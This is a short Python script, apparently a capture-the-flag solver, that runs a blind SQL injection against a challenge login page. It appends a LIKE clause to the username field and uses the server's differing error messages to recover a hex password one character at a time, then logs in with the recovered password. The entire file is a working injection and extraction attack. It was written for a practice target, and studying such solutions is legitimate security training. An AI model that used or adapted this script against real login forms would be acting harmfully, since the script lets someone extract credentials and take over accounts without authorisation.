import sys
import requests

if len(sys.argv) != 2:
    print("Usage: python solve.py <username>")
    exit(-1)

alphabet = "0123456789abcdef"
username = sys.argv[1]
password = "a"
curr_pass = ""
payload = "' AND password LIKE '"
headers = {
    'Content-Type': "application/x-www-form-urlencoded"
}


url = "https://injection-perfection.acmcyber.com/"

s = requests.Session()

run = 0
while True:
    if len(curr_pass) != run:
        break

    for c in alphabet:
        username_payload = username + payload + curr_pass + c + "%"
        print("Trying: " + username_payload)
        r = s.post(
            url,
            data={"username": username_payload, "password": password},
            headers=headers
        )
        if "Invalid Login" in r.text:
            exit(-1)
        if "incorrect password" in r.text:
            curr_pass += c
            print("Found: " + curr_pass)
            break

    run += 1

print("Password: " + curr_pass)
r = s.post(
    url,
    data={"username": username, "password": curr_pass},
    headers=headers
)

print(r.text)
